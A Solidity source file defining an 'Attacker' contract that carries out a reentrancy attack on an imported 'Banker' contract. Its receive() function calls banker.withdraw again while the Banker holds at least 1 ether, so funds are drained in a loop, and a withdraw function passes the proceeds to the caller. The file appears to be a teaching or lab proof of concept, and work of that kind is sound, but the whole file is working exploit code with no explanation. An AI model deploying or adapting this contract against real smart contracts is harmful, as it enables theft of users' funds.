// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Banker.sol";

contract Attacker {
    Banker public banker;

    receive() external payable {
        if (address(banker).balance >= 1 ether) {
            banker.withdraw(1 ether);
        }
    }

    constructor(address bankerAddress) {
        banker = Banker(bankerAddress);
    }

    function deposit() public payable {
        banker.deposit{value: msg.value}();
    }

    function attack() public {
        banker.withdraw(1 ether);
    }

    function withdraw() public {
        payable(msg.sender).transfer(address(this).balance);
    }
}